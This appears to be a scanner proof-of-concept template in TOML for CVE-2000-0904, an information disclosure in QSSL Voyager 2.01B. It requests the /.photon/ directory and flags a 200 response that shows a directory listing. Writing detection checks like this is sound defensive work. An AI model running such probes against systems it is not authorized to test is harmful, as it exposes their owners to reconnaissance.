[info]
author = "ave"
description = "通过尝试访问 Web 文档根目录下的 .photon 目录来验证是否存在敏感信息泄露漏洞"
id = "POC-AVE-2000-0659"
name = "QSSL Voyager 2.01B .photon Directory Information Disclosure PoC"
severity = "medium"
tags = ["ave-2000-0659"]
vuln_id = [
    "CVE-2000-0904",
    "AVE-2000-0659",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/.photon/"
protocol = "http"

[[poc.requests.matchers]]
expect = true
status = [200]
type = "status"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = [
    ".photon",
    "Index of /",
]
